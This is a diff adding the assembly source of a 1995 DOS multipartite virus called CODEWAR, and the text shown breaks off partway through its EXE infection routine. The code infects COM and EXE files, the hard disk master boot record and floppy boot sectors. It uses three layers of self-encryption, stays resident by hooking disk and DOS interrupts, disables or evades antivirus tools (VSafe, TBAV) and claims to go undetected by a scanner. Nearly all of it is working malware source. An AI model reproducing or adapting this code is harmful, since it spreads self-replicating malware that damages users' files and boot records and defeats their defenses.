@@ -1,0 +1,1732 @@
+;-------------------------------------------------------------------------
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;                        C O D E W A R  V i r u s
+;
+;
+;                   Programming by Sirius & Mindmaniac
+;
+;
+;                             Germany 1995.
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;---------------------------------------------------------------------------
+;
+;
+;
+;  Please note:
+; --------------
+;
+;  This programme introduces into the technique of multipartite viruses.
+;  Pass to responsible people only!
+;
+;
+;
+;
+;
+;   Features:
+; -------------
+;
+;  - Infection Type: - COM files,
+;                    - EXE files
+;                    - Master Boot Record (MBR) on Hard Disk Drives
+;                    - Boot Sector (BS) on Floppy Disk Drives
+;                      ( 1.44 Mb + 1.2 Mb )
+;
+;
+;  - Encryption:     3-layer-enryption (generic)
+;
+;  - Memory resident (Bootsector virus technique)
+;
+;  - Retro features.
+;
+;  - Similarities:   Alive (File Virus), Junkie (Multipartite Virus)
+;
+;
+;
+;
+;
+;  Additional Notes:
+; -------------------
+;
+;  Infected objects are not detected by SSC Anti-Virus Scanner and
+;  Analyzer.
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;
+;----------------------------------------------------------------------------
+
+
+Ofs             equ     Offset
+Cmt             equ     Comment
+B               equ     byte ptr
+W               equ     word ptr
+
+Directory       STRUC
+DS_Drive        db ?
+DS_File_Name    db 8 dup(0)
+DS_File_Ext     db 3 dup(0)
+DS_File_Attr    db ?
+DS_Reserved     db 10 dup(0)
+DS_Time         dw ?
+DS_Date         dw ?
+DS_Start_Clust  dw ?
+DS_File_Size    dd ?
+Directory       ENDS
+
+FCB             STRUC
+FCB_Drive       db ?
+FCB_File_Name   db 8 dup(0)
+FCB_File_Ext    db 3 dup(0)
+FCB_Block       dw ?
+FCB_Rec_Size    dw ?
+FCB_File_Size   dd ?
+FCB_File_Date   dw ?
+FCB_File_Time   dw ?
+FCB_Reserved    db 8 dup(0)
+FCB_Record      db ?
+FCB_Random      dd ?
+FCB             ENDS
+
+DTA             STRUC
+DTA_Reserved    db 21 dup(0)
+DTA_File_Attr   db ?
+DTA_File_Time1  db ?                    ; = seconds
+DTA_File_Time2  db ?
+DTA_File_Date   dw ?
+DTA_File_Size   dd ?
+DTA_File_Name   db 13 dup(0)
+DTA             ENDS
+
+SFT             STRUC
+SFT_Reserved1   dw ?    ; 0
+SFT_Open_Mode   dw ?    ; 2
+SFT_File_Attr   db ?    ; 4
+SFT_Reserved2   dw ?    ; 5
+SFT_Reserved3   dd ?    ; 7
+SFT_Reserved4   dw ?    ; 11
+SFT_File_Time   dw ?    ; 13
+SFT_File_Date   dw ?    ; 15
+SFT_File_SizeLo dw ?    ; 17
+SFT_File_SizeHi dw ?    ; 19
+SFT_Curr_OfsLo  dw ?    ; 21
+SFT_Curr_OfsHi  dw ?    ; 23
+SFT_Reserved7   dw ?    ; 25
+SFT_Reserved8   dd ?    ; 27
+SFT_Reserved9   db ?    ; 31
+SFT_File_Name   db 8 dup(?)     ; 32 = 20h
+SFT_File_Ext    db 3 dup(?)     ; 40 = 28h
+SFT             ENDS
+
+ExeH            STRUC
+Buf_0h          dw 0    ; "MZ" oder "ZM" (selten)
+Buf_2h          dw 0    ; Last page size
+Buf_4h          dw 0    ; Size in pages
+Buf_6h          dw 0
+Buf_8h          dw 0
+Buf_ah          dw 0
+Buf_ch          dw 0
+Buf_eh          dw 0    ; SS
+Buf_10h         dw 0    ; SP
+Buf_12h         dw 0    ; CheckSum
+Buf_14h         dw 0    ; IP
+Buf_16h         dw 0    ; CS
+Buf_18h         dw 0    ; WINDOWS Marker
+ExeH            ENDS
+
+
+
+Flag_Exec_Infection     equ     1
+
+ofs                     equ     offset
+cmt                     equ     comment
+
+Reloc                   =       ofs Vir_Start
+Camouf                  =       2
+Enc_Word_Length         =       (Virus_Length/2)+1
+Virus_Length            =       4*512
+Header_Length           =       18h
+
+File_Type_COM           =       byte (Restore_COM-File_Type)-2
+File_Type_EXE           =       byte (Restore_EXE-File_Type)-2
+
+Media_Descriptor_144    =       0F0h
+Media_Descriptor_120    =       0F9h
+
+Vir_Len_Sectors         =       4
+
+Vir_Harddisk_Track      =       0
+Vir_Harddisk_Head       =       0
+Vir_Harddisk_Sector     =       4
+
+Vir_Floppy_120_Track    =       79
+Vir_Floppy_120_Head     =       1
+Vir_Floppy_120_Sector   =       6
+
+Vir_Floppy_144_Track    =       79
+Vir_Floppy_144_Head     =       1
+Vir_Floppy_144_Sector   =       15
+
+
+Names_HDD_Track         =       0
+Names_HDD_Head          =       0
+Names_HDD_Sector        =       3
+
+
+; in bytes
+
+F_Min_LengthCOM         =       3000
+F_Max_LengthCOM         =       50000
+
+; in pages
+
+F_Min_LengthEXE         =       6               ; = 3 kb
+F_Max_LengthEXE         =       2000            ; = 1000 kb
+
+
+Time_Stamp              =       13
+TOM_Decrement_value     =       5
+
+
+        .286
+CODE    SEGMENT BYTE PUBLIC 'CODE'
+ASSUME  CS:CODE,DS:CODE,ES:NOTHING,SS:NOTHING
+        ORG     0100h
+
+
+Sample:
+        jmp     Vir_Start
+
+;----------------------------------------------------------------------------
+; allways start at seg:0000
+
+        org     100h+ 1*16
+;----------------------------------------------------------------------------
+
+Vir_Start:
+
+;----------------------------------------------------------------------------
+; 1st encryption layer (outer)
+;----------------------------------------------------------------------------
+                cld
+                mov     CX,Enc_Word_Length
+
+                MOV     bp,1234h
+                ORG     $-2
+E1_Idx_Val      dw      ofs E1_Encrypted_Code
+
+                mov     ax,1234h
+                ORG     $-2
+E1_Key_Val      dw      0
+
+                db      081h,3eh
+E1_Dec_Loop:
+                XOR     Word Ptr cs:[bp],ax
+
+                inc     bp
+                inc     bp
+
+                dec     cx
+
+                or      cx,cx
+                jz      E1_Loop_done
+
+                jmp     short E1_Dec_Loop
+                db      09ah                    ;=CALL FAR
+E1_Loop_done:
+;----------------------------------------------------------------------------
+
+
+E1_Encrypted_Code:
+
+
+;----------------------------------------------------------------------------
+; 2nd encryption layer (inner)
+;----------------------------------------------------------------------------
+                mov     cx,(Enc_Word_Length/2) +1
+
+                MOV     si,1234h
+                ORG     $-2
+E2_Idx_Val      dw      ofs E2_Encrypted_Code
+
+                mov     ax,1234h
+                ORG     $-2
+E2_Key_Val_1    dw      0
+
+                mov     bx,1234h
+                ORG     $-2
+E2_Key_Val_2    dw      0
+
+E2_Dec_Loop:
+                xor     w cs:[si],ax
+                inc     si
+                inc     si
+
+                xor     w cs:[si],bx
+                inc     si
+                inc     si
+
+                loop    short E2_Dec_Loop
+
+;----------------------------------------------------------------------------
+
+
+E2_Encrypted_Code:
+
+
+;----------------------------------------------------------------------------
+; 3rd encryption layer (innerst)
+;----------------------------------------------------------------------------
+                mov     cx,(Enc_Word_Length/3)+1
+
+                MOV     si,1234h
+                ORG     $-2
+E3_Idx_Val      dw      ofs E3_Encrypted_Code
+
+                mov     ax,1234h
+                ORG     $-2
+E3_Key_Val_1    dw      0
+
+                mov     bx,1234h
+                ORG     $-2
+E3_Key_Val_2    dw      0
+
+                mov     dx,1234h
+                ORG     $-2
+E3_Key_Val_3    dw      0
+
+E3_Dec_Loop:
+                xor     w cs:[si],ax
+                inc     si
+                inc     si
+
+                xor     w cs:[si],bx
+                inc     si
+                inc     si
+
+                xor     w cs:[si],dx
+                inc     si
+                inc     si
+;Chg1+2
+                add     ax,1234h
+                ORG     $-2
+E3_Key_Change_1 dw      0
+
+                add     bx,1234h
+                ORG     $-2
+E3_Key_Change_2 dw      0
+
+                loop    short E3_Dec_Loop
+;----------------------------------------------------------------------------
+
+
+E3_Encrypted_Code:
+
+
+;----------------------------------------------------------------------------
+        cld
+        mov     ax,cs
+        or      ax,ax
+        jnz     Run_file
+        jmp     Its_boottime
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+; Restore program-header, the registers and go back to the program
+
+Exit_File:
+                pop     es ds
+
+
+                db      0EBh                    ; JMP-short-opcode
+File_Type       db      File_Type_COM
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; restore the COM-host-file
+
+Restore_COM:
+        MOV     DI,100h
+        push    di
+
+        MOV     Word Ptr cs:[DI],1234h
+        ORG     $-2
+Rest1   dw      0c3c3h
+
+        MOV     byte Ptr cs:[DI+2],12h
+        ORG     $-1
+Rest2   db      0c3h
+
+ZeroRegsForHost:
+        mov     cx,8
+nullup: push    0
+        loop    nullup
+        popa
+
+        ret
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; restore the EXE-host-file
+
+Restore_EXE:
+        mov     ax,ds                           ; DS = PSP !
+        add     ax,10h                          ; + 100h bytes of PSP
+        add     cs:[bx+ofs Old_CS -Reloc],ax    ; = new CS
+        add     ax,0000                         ; + old SS
+        org     $-2
+Old_SS  dw      ?
+        cli
+        mov     ss,ax                           ; set SS
+        mov     sp,0000                         ; set SP
+        org     $-2
+Old_SP  dw      ?
+        sti
+
+        call    ZeroRegsForHost
+
+        db      0EAh                            ; = JMP Old_CS:Old_IP
+
+; In an EXE - header-values are stored here
+
+Old_ExeValues:
+Old_IP          dw      0
+Old_CS          dw      0
+;----------------------------------------------------------------------------
+
+
+        db      " PSYCHo-TECH GMBH 1995 "
+
+;----------------------------------------------------------------------------
+Run_File:
+
+; relocate
+        CALL    Delta
+Delta:
+        POP     BX
+        SUB     BX,1234h
+        ORG     $-2
+        dw      ofs Delta -Reloc
+
+; save PSP
+        push    ds es
+
+
+; assume segments
+        push    cs cs
+        pop     ds es
+
+; prepare the retf to Exit_File
+
+        push    cs
+        lea     ax,cs:[bx+ofs Exit_File -Reloc]
+        push    ax
+
+; change CS, so we start at ofs 0 not 100h
+
+        mov     ax,cs
+        SHR     BX,4
+        ADD     AX,BX
+        PUSH    AX
+        MOV     AX,ofs Continue -Reloc
+        PUSH    AX
+        RETF
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Gag:
+        push    ax ds
+        in      al,40h
+        test    al,1
+        jz      Skip_Gag
+
+        mov     ax,0b800h
+        mov     ds,ax
+        mov     word ptr ds:[(79*2)],00cf9h     ;= lightred point "ù"
+Skip_Gag:
+        pop     ds ax
+        ret
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Its_boottime:
+
+        call    Gag
+
+        xor     di,di
+        MOV     DS,DI
+
+        mov     si,7c00h+512
+
+; decrement RAM by xx kB
+
+        SUB     Word Ptr DS:[0413h],TOM_Decrement_value
+        MOV     AX,DS:[0413h]
+        MOV     BX,40h
+        MUL     BX
+        MOV     ES,AX
+
+; move virus to TOM (xxxx bytes)
+
+        MOV     CX,Virus_Length
+        CLD
+        REPZ    MOVSB
+
+; set new INT 13h and 1Ch
+
+        CLI
+
+        MOV     SI,4*13h
+        MOV     DI,ofs Old_Int_13 -Reloc
+        MOV     AX,ofs New_Int_13 -Reloc
+        CALL    Get_Set_Int
+
+        MOV     Byte Ptr ES:[ofs Got_Int_21 -Reloc],0
+
+        MOV     SI,4*1ch
+        MOV     DI,ofs Old_Int_1c -Reloc
+        MOV     AX,ofs New_Int_1c -Reloc
+        CALL    Get_Set_Int
+
+        STI
+
+; save INT 21h
+
+        MOV     DI,ofs Old_Int_21 -Reloc
+        MOV     SI,4*21h
+        MOVSW
+        MOVSW
+
+        mov     di,7c00h
+
+; prepare RETF to orig PAR/BS
+
+        PUSH    CS      ;=0
+        PUSH    DI      ;=7c00h
+
+        push    es
+        push    ofs Boot_Finish -Reloc
+
+        PUSH    CS
+        POP     ES
+
+; restore the JUMP-Word and the patched PAR/BS
+
+        MOV     SI,7c00h + 512 + BS_First_word -Reloc
+        MOVSW
+
+        mov     di,7c00h + 60h   ; offset of the patch-area
+        CALL    Call_Move_20
+
+; Patch the TBAV immunized partition
+
+        cmp     w cs:[7c00h+0dfh],"hT"
+        jne     no_TB_partition
+        mov     b cs:[7c00h+73h],0
+
+no_TB_partition:
+
+; goto Boot_Finish / infect C:
+
+        retf
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+New_Int_13:
+
+        cmp     ax,0201h                        ; reading ?
+        JNZ     Jump_Old_Int_13
+
+        CMP     CX,0001h                        ; sector 1 and Track 0 ?
+        JNZ     Jump_Old_Int_13
+
+        or      dh,dh                           ; head 0 ?
+        jnz     Jump_Old_Int_13
+
+        pusha
+        PUSH    DS
+        PUSH    ES
+
+        CALL    Int13_Works
+
+        POP     ES
+        POP     DS
+        popa
+
+Jump_Old_Int_13:
+        jmp     dword ptr cs:(ofs Old_Int_13 -Reloc)
+
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Call_Old_Int_13:
+        PUSHF
+        call    dword ptr cs:(ofs Old_Int_13 -Reloc)
+        RET
+;----------------------------------------------------------------------------
+
+
+        db      " >>> BRAVEd DANGER 4 BRAVE PEOPLe <<< "
+
+
+;----------------------------------------------------------------------------
+Continue:
+        PUSH    DS
+        PUSH    ES
+
+        XOR     AX,AX
+        MOV     DS,AX
+
+        PUSH    CS
+        POP     ES
+
+; save int 13h
+
+        MOV     DI,ofs Old_Int_13 -Reloc
+        MOV     SI,4*13h
+        CLD
+        MOVSW
+        MOVSW
+        JMP     Short Read_Drive_C
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Boot_Finish:
+        PUSH    DS
+        PUSH    ES
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Read_Drive_C:
+        MOV     AH,02h
+        MOV     DL,80h
+
+        CALL    Int13_Works     ; infect drive C
+
+        POP     ES
+        POP     DS
+
+        XOR     AX,AX
+        XOR     BX,BX
+        retf
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Int13_Works:
+
+        PUSH    CS
+        POP     DS
+        PUSH    CS
+        POP     ES
+
+        CALL    Read_or_Write_BS_from_A
+        jnb     oky                             ; Goto_Ret
+        jmp     Goto_Ret
+oky:
+
+
+        MOV     DI,ofs Buffer + 60h -Reloc
+
+; check if BS is infected
+
+        CMP     Word Ptr [SI],05EEBh    ; SI=@buffer
+        JNZ     BS_not_infected
+
+        CMP     Word Ptr [DI],0FF33h    ; == xor di,di
+        JZ      Goto_Ret
+
+BS_not_infected:
+
+; test if it is Harddisk or floppy
+
+        cmp     dl,79h
+        ja      Not_Floppy
+
+
+; test if HD 1.44 (=F0) or HD 1.2 (=F9) floppy
+
+        CMP     Byte Ptr DS:[ofs Buffer+15h -Reloc],Media_Descriptor_144
+        JZ      Found_ID_F0
+
+        CMP     Byte Ptr DS:[ofs Buffer+15h -Reloc],Media_Descriptor_120
+        JNZ     Goto_Ret
+
+Large_floppy:
+        MOV     CL,Vir_Floppy_120_Sector
+        JMP     Short Floppy_Disk
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; 1.44 floppy found
+
+Found_ID_F0:
+        MOV     AX,40h
+        MOV     DS,AX
+
+; 0:490h == AT Drive 0 status
+
+        CMP     Byte Ptr DS:[0090h],97h
+        JZ      Large_Floppy
+
+; it is 1.44 Mb
+
+        MOV     CL,Vir_Floppy_144_Sector
+
+Floppy_Disk:
+        PUSH    CS
+        POP     DS
+
+        MOV     CH,Vir_Floppy_120_Track
+        JMP     Short Head_01
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Not_floppy:
+        MOV     CX,Vir_Harddisk_Sector
+        JMP     Short Head_00
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Head_01:
+        MOV     DH,Vir_Floppy_120_Head
+Head_00:
+        MOV     DS:[ofs Ptc_CX -Reloc],CX   ; patch the PAR
+        MOV     DS:[ofs Ptc_DX -Reloc],DX
+
+        PUSH    DX
+        PUSH    CX
+        PUSH    SI
+        PUSH    DI
+
+; Move the JMP-Op to the beginning of BS/PAR
+
+        MOV     DI,ofs BS_first_word -Reloc     ; SI=ofs buffer
+        MOVSW
+        POP     SI
+
+        CALL    Call_Move_20
+
+        MOV     SI,DI
+        POP     DI
+        MOVSW
+
+        add     di,60h-2
+        CALL    Call_Move_20                    
+
+; write BS
+
+        MOV     AX,0301h
+        PUSH    AX
+        CALL    Read_or_Write_BS_from_A
+
+        POP     AX
+        POP     CX
+        POP     DX
+
+        MOV     AL,Vir_Len_Sectors
+        MOV     BX,ofs Buffer -Reloc
+        JB      Goto_Ret
+
+
+        MOV     Word Ptr DS:[ofs E1_Idx_Val -Reloc],7c00h +512+E1_Encrypted_Code -Reloc -Camouf
+        MOV     Word Ptr DS:[ofs E2_Idx_Val -Reloc],7c00h +512+E2_Encrypted_Code -Reloc
+        MOV     Word Ptr DS:[ofs E3_Idx_Val -Reloc],7c00h +512+E3_Encrypted_Code -Reloc
+
+
+        CALL    Encrypt_Virus
+
+        CALL    Call_Old_Int_13
+Goto_Ret:
+        RET
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+; read the PAR/BS from drive
+;----------------------------------------------------------------------------
+
+Read_or_Write_BS_from_A:
+        MOV     AL,01h
+        MOV     CX,0001h
+        MOV     DH,0
+        MOV     BX,ofs Buffer -Reloc
+        MOV     SI,BX
+
+        PUSH    DX
+        CALL    Call_Old_Int_13
+        POP     DX
+
+        RET
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Call_Move_20:
+        MOV     CX,32
+        CLD
+        REPZ    MOVSb
+        RET
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Get_Set_Int:
+
+        PUSH    SI
+        MOVSW
+        MOVSW
+        POP     SI
+        MOV     [SI],AX
+        MOV     [SI+2],ES
+        RET
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Get_Random:
+
+;;        xor     ax,ax
+;;        ret
+
+        push    cx dx
+
+        in      al,40h
+        mov     cl,al
+
+        xor     ax,ax
+        int     1ah
+
+        in      al,40h
+        mov     ah,al
+
+        in      al,40h
+        rol     ax,cl
+
+        pop     dx cx
+        ret
+;----------------------------------------------------------------------------
+
+
+
+;============================================================================
+Encrypt_Virus:
+
+        pusha
+        push    ds es
+
+; get (random) key-values
+
+; L1
+        call    Get_Random
+        MOV     word ptr cs:[ofs E1_Key_Val -Reloc],ax
+
+; L2
+        call    Get_Random
+        MOV     word ptr cs:[ofs E2_Key_Val_1 -Reloc],ax
+
+        call    Get_Random
+        MOV     word ptr cs:[ofs E2_Key_Val_2 -Reloc],ax
+
+; L3
+        call    Get_Random
+        MOV     word ptr cs:[ofs E3_Key_Val_1 -Reloc],ax
+
+        call    Get_Random
+        MOV     word ptr cs:[ofs E3_Key_Val_2 -Reloc],ax
+
+        call    Get_Random
+        MOV     word ptr cs:[ofs E3_Key_Val_3 -Reloc],ax
+
+        call    Get_Random
+        MOV     word ptr cs:[ofs E3_Key_Change_1 -Reloc],ax
+
+        call    Get_Random
+        MOV     word ptr cs:[ofs E3_Key_Change_2 -Reloc],ax
+
+
+; move bytes
+
+        PUSH    CS
+        POP     ES
+
+        MOV     SI,1234h
+        org     $-2
+        dw      0
+
+        MOV     DI,ofs Buffer -Reloc
+        MOV     CX,(ofs Encrypted_Code_End - ofs Vir_Start)
+        REPZ    MOVSB
+
+
+; fill
+
+        pusha
+        mov     cx,2*80
+Fill_random:
+        in      al,40h
+        cld
+        stosb
+        loop    Fill_random
+        popa
+
+
+;----------------------------------------------------------------------------
+; encrypt innerst layer E3
+
+        MOV     w ax,cs:[ofs E3_Key_Val_1 -Reloc]
+        MOV     w bx,cs:[ofs E3_Key_Val_2 -Reloc]
+        MOV     w dx,cs:[ofs E3_Key_Val_3 -Reloc]
+
+;chg1+2
+        MOV     w di,cs:[ofs E3_Key_Change_1 -Reloc]
+        MOV     w bp,cs:[ofs E3_Key_Change_2 -Reloc]
+
+        MOV     si,ofs Buffer -Reloc
+        ADD     si,ofs E3_Encrypted_Code -Reloc
+
+        MOV     CX,(Enc_Word_Length/3) +1
+
+C3_Enc_Loop:
+        XOR     cs:[si],ax
+        INC     si
+        INC     si
+
+        XOR     cs:[si],bx
+        INC     si
+        INC     si
+
+        XOR     cs:[si],dx
+        INC     si
+        INC     si
+;chg1
+        add     ax,di
+;chg2
+        add     bx,bp
+
+        LOOP    C3_Enc_Loop
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+; encrypt inner layer E2
+
+        MOV     w ax,cs:[ofs E2_Key_Val_1 -Reloc]
+        MOV     w bx,cs:[ofs E2_Key_Val_2 -Reloc]
+
+        MOV     si,ofs Buffer -Reloc
+        ADD     si,ofs E2_Encrypted_Code -Reloc
+
+        MOV     CX,(Enc_Word_Length/2) +1
+
+C2_Enc_Loop:
+        XOR     cs:[si],ax
+        INC     si
+        INC     si
+
+        XOR     cs:[si],bx
+        INC     si
+        INC     si
+
+        LOOP    C2_Enc_Loop
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+; encrypt outer layer E1
+
+        MOV     word ptr bx,cs:[ofs E1_Key_Val -Reloc]
+
+        MOV     DI,ofs Buffer -Reloc
+        ADD     DI,ofs E1_Encrypted_Code -Reloc
+
+        MOV     CX,Enc_Word_Length
+
+Enc_Loop:
+        XOR     cs:[DI],BX
+        INC     DI
+        INC     DI
+        LOOP    Enc_Loop
+;----------------------------------------------------------------------------
+
+
+Mult_POP:
+        pop     es ds
+        popa
+
+        RET
+;============================================================================
+
+
+
+;----------------------------------------------------------------------------
+New_Int_1c:
+        CMP     Byte Ptr CS:[ofs Got_Int_21 -Reloc],1
+        JZ      Jump_Int_1c
+
+        pusha
+        push    ds es
+
+        MOV     SI,4*21h
+        XOR     AX,AX
+        MOV     DS,AX
+
+; load int 20h seg and compare if below 800h
+
+        MOV     AX,DS:[4*20h +2]
+
+        CMP     AX,0000h
+        JZ      Exit_Int_1c
+
+        CMP     AX,800h
+        JA      Exit_Int_1c
+
+; cmp with int 21h seg
+
+        CMP     [SI+02h],AX
+        JNZ     Exit_Int_1c
+
+; cmp with int 27h seg
+
+        CMP     DS:[4*27h +2],AX
+        JNZ     Exit_Int_1c
+
+; cmp with int 2Fh seg
+
+        CMP     DS:[4*2Fh +2],AX
+        JNZ     Exit_Int_1c
+
+; ok, now hook int 21h
+
+        CLI
+        MOV     DI,ofs Old_Int_21 -Reloc
+        PUSH    CS
+        POP     ES
+        MOV     AX,ofs New_Int_21 -Reloc
+        CALL    Get_Set_Int
+
+; set the flag for it
+        MOV     Byte Ptr CS:[ofs Got_Int_21 -Reloc],01h
+        STI
+
+; get int 2f vector
+
+        push    0
+        pop     ds
+        mov     w ax,ds:[4*2fh]
+        mov     w cs:[ofs Old_Int_2f -Reloc],ax
+        mov     w ax,ds:[4*2fh+2]
+        mov     w cs:[ofs Old_Int_2f -Reloc+2],ax
+
+
+
+Exit_Int_1c:
+
+        pop     es ds
+        popa
+
+Jump_Int_1c:
+        jmp     dword ptr cs:(ofs Old_int_1c -Reloc)
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+New_Int_21:
+
+
+IF      Flag_Exec_Infection
+        CMP     AX,4B00h
+        JZ      Control_Operation
+ENDIF
+
+
+        CMP     AH,3Dh
+        JZ      Control_Operation
+
+Exit_Int_21:
+        jmp     dword ptr cs:(ofs Old_Int_21 -Reloc)
+;----------------------------------------------------------------------------
+
+
+;----------------------------------------------------------------------------
+Control_Operation:
+
+        pusha
+        push    ds es
+
+Not_Ext_Open:
+        xchg    ax,cx
+        xor     ax,ax
+
+        call    Deinstall_Vsafe
+
+; Hook int 24h
+
+        PUSH    DS
+        MOV     DS,AX
+        LES     AX,DS:[4*24h]
+        MOV     Word Ptr DS:[4*24h], ofs New_Int_24 -Reloc
+        MOV     DS:[4*24h +2],CS
+        POP     DS
+
+        PUSH    ES
+        PUSH    AX
+
+; open file
+
+        MOV     AX,3D00h
+        call    Call_Old_Int21
+        jb      File_Error
+
+        mov     bx,ax
+
+        PUSH    CS
+        POP     DS
+
+; get SFT
+
+        PUSH    BX
+        MOV     AX,1220h
+        call    Call_Old_Int2F                 ; INT     2Fh
+
+        MOV     AX,1216h
+        MOV     BL,ES:[DI]
+        call    Call_Old_Int2F                 ; INT     2Fh
+        POP     BX
+
+        JB      Close_Exit
+
+; skip AV-programs ?
+
+        call    Check_If_AV_Name
+        jz      goto_close_exit
+
+
+; test if executable-file
+
+        CMP     Word Ptr ES:[DI+28h],"OC"
+        JZ      Is_COM
+
+        CMP     Word Ptr ES:[DI+28h],"XE"
+        JZ      Is_EXE
+
+goto_close_exit:
+        JMP     Short Close_Exit
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Is_COM:
+Is_EXE:
+
+; Check if infected
+        mov     ax,es:[di.SFT_File_Time]
+        and     al,00011111b
+        cmp     al,Time_Stamp
+        jz      Close_Exit
+
+        PUSH    ES
+        PUSH    DI
+
+; Datum/Zeit sichern
+        mov     ax,es:[di.SFT_File_Time]
+        mov     cs:[ofs Old_Time -Reloc],ax
+        mov     ax,es:[di.SFT_File_Date]
+        mov     cs:[ofs Old_Date -Reloc],ax
+
+; Get file length directly from the SFT and save it
+        mov     ax,es:[di+SFT_File_SizeLo]
+        mov     cs:[ofs File_SizeLo -Reloc], ax
+        mov     ax,es:[di.SFT_File_SizeHi]
+        mov     cs:[ofs File_SizeHi -Reloc], ax
+
+; Force read/write mode
+        mov     word ptr es:[di.SFT_Open_Mode],2
+
+        CALL    Read_Infect
+
+        POP     DI
+        POP     ES
+
+Close_Exit:
+
+        MOV     AH,3Eh
+        INT     21h
+
+File_Error:
+        XOR     SI,SI
+        MOV     DS,SI
+
+; restore INT 24h
+
+        POP     AX
+        POP     ES
+
+        MOV     DS:[4*24h],AX
+        MOV     DS:[4*24h +2],ES
+
+
+        pop     es ds
+        popa
+
+        JMP     Exit_Int_21
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+goto_Infect_Ret:
+        jmp     Infect_Ret
+;----------------------------------------------------------------------------
+
+
+
+;----------------------------------------------------------------------------
+Process_EXE:
+        mov    byte ptr cs:[ofs File_Type -Reloc],File_Type_EXE
+
+; save handle
+        mov     word ptr cs:[ofs Handle -Reloc],bx
+
+; Dont infect to big/small EXE-files!
+        mov     word ptr AX,cs:[ofs File_Buffer.BUF_4h -Reloc]  ; EXE size in 512 byte pages
+        cmp     AX,F_Min_LengthEXE                              ; Don't infect files less than xxxx pages
+        JB      goto_Infect_Ret
+        cmp     AX,F_Max_LengthEXE                              ; Or bigger than xxxx pages
+        JA      goto_Infect_Ret
+
+; save handle
+        push    bx
+
+; seek to EOF
+
+        CALL    Seek_EOF
+
+
+; It's OK!  Process it now !
+        les     ax,dword ptr cs:[File_Buffer.Buf_14h -Reloc]    ;Entry_Point_Disp
+        mov     cs:[ofs Old_IP -Reloc],ax
+        mov     cs:[ofs Old_CS -Reloc],es
+
+        les     ax,dword ptr cs:[File_Buffer.Buf_eh -Reloc]     ;Stack_Disp
+        mov     cs:[ofs Old_SS -Reloc],ax
+        mov     cs:[ofs Old_SP -Reloc],es
+
+        mov     ax,cs:[ofs File_Buffer.Buf_8h -Reloc]  ; = Header size in paras
+        mov     cl,4
+        shl     ax,cl                                    ; Convert to byte-format
+
+; Get file size from SFT
+        push    ax                                       ; Save header size
+        mov     ax,cs:[ofs File_SizeLo -Reloc]
+        mov     dx,cs:[ofs File_SizeHi -Reloc]
+
+; add the padding-number
+        mov     cx,cs:[ofs File_SizeLo -Reloc]
+        MOV     CH,CL
+        MOV     CL,16
+        SUB     CL,CH
+        AND     CX,1+2+4+8
+        add     ax,cx
+
+; save the padding-number
+        mov     cs:[ofs Padded -reloc],cx
+
+        pop     bx                                       ; = Header size
+
+        sub     ax,bx                   ; DX:AX := file size - header size
+        sbb     dx,0
+
+        mov     cx,16                   ; Convert to seg:ofs format
+
+        div     cx                      ; DX:AX := (DX:AX) / 10h
+
+        or      dx,dx                   ; IP
+        jz      was_rounded
+
+        xor     dx,dx
+        mov     cs:[ofs File_Buffer.Buf_14h -Reloc],dx              ; New IP
+        mov     cs:[ofs File_Buffer.Buf_16h -Reloc],ax              ; New CS
+
+        inc     word ptr cs:[ofs File_Buffer.Buf_16h -Reloc]                 ; CS
+        jmp     rounded
+
+was_rounded:
+        mov     cs:[ofs File_Buffer.Buf_14h -Reloc],dx              ; New IP
+        mov     cs:[ofs File_Buffer.Buf_16h -Reloc],ax              ; New CS
+
+rounded:
+        inc     ax                                                  ; Avoid the "K" TB-flag (seems unecessary)
+        mov     word ptr cs:[ofs File_Buffer.Buf_eh -Reloc],ax      ; New SS
+        mov     word ptr cs:[ofs File_Buffer.Buf_10h -Reloc],0      ; New SP
+
+        mov     ax,cs:[ofs File_SizeLo -Reloc]
+        mov     dx,cs:[ofs File_SizeHi -Reloc]
+
+; add the padding-number
+        add     ax,cs:[ofs Padded -reloc]
+        add     dx,0
+
+
+        add     ax,Virus_Length         ; Lo-word
+        adc     dx,0                    ; Hi-word
+
+        push    ax                      ; Lo-word
+        shr     ax,9                    ;
+        ror     dx,9
+        stc
+        adc     dx,ax
+        pop     ax
+
+        and     ah,1                                           ; Mod 512
+        mov     cs:[ofs File_Buffer.Buf_4h -Reloc],dx               ; Size in pages (rounded up)
+        mov     cs:[ofs File_Buffer.Buf_2h -Reloc],ax               ; Size of last page (in bytes)
+
+        push    cs cs
+        pop     ds es
+
+
+        mov     word ptr bx,cs:[ofs Handle -Reloc]
+        mov     ax,cs:[ofs File_SizeLo -Reloc]
+
+        CALL    Padding
+
+; Construct index for decryptor
